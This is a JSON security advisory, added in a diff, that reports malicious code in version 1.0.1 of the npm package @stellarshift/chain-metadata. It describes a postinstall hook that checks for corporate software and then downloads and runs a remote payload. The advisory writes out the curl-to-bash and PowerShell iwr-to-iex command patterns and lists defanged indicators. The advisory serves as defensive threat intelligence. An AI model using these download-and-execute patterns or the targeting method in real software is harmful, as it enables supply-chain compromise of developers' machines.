@@ -1,0 +1,64 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-11834",
+  "modified": "2026-09-02T13:03:10Z",
+  "published": "2026-09-02T13:02:03Z",
+  "summary": "Malicious code in @stellarshift/chain-metadata (npm)",
+  "details": "The package's postinstall hook (scripts/postinstall.js) is a remote code download-and-execute loader. It first checks the host environment and only proceeds on macOS or Windows systems that have both the Lark/Feishu messaging app and FortiClient VPN installed (a corporate-targeting filter); on any other environment it silently exits. When the target environment matches, it fetches a stage-1 payload from hxxps://mexc-1258433570[.]cos[.]ap-beijing[.]myqcloud[.]com/abi-tool-damon and executes it via `curl -fsSL \u003curl\u003e | bash` on macOS or `powershell iwr -Uri \u003curl\u003e | iex` on Windows, running in the background with output suppressed. The fetched payload is a beacon/stage-1 script that downloads and runs further code.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@stellarshift/chain-metadata",
+        "purl": "pkg:npm/%40stellarshift/chain-metadata"
+      },
+      "versions": [
+        "1.0.1"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@stellarshift/chain-metadata/v/1.0.1"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-11834"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-09-02T13:02:03Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "mexc-1258433570[.]cos[.]ap-beijing[.]myqcloud[.]com"
+        ],
+        "sha256": [
+          "7881adeefe21d8cdd6657efd135b8a8f349884fb49d542d7e0cbed8fdef43175"
+        ],
+        "url_observed": [
+          "hxxps://mexc-1258433570[.]cos[.]ap-beijing[.]myqcloud[.]com/abi-tool-damon"
+        ]
+      }
+    }
+  }
+}
